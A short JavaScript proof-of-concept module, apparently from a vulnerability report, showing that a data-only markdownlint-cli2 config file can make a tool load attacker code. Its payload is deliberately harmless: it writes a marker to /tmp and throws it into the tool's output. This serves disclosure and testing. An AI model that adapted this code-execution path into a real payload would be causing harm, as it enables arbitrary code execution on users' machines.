// F-RUNNERSINKS-02 PoC — harmless runtime marker only. No network, no persistence.
const fs = require("fs");
const MARK = "POC-RS2J_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
let back = "write-failed";
try {
  fs.writeFileSync("/tmp/poc_rs2_marker.txt", MARK);
  back = fs.readFileSync("/tmp/poc_rs2_marker.txt", "utf8");
} catch (e) {
  back = "readback-failed:" + String(e).slice(0, 60);
}
// Thrown at LOAD time so the vendor's tool-output block echoes the runtime marker in-band.
throw new Error("F-RUNNERSINKS-02: attacker module LOADED from DATA-ONLY .markdownlint-cli2.jsonc. "
  + "runtime marker " + MARK + " | /tmp write+readback " + back);
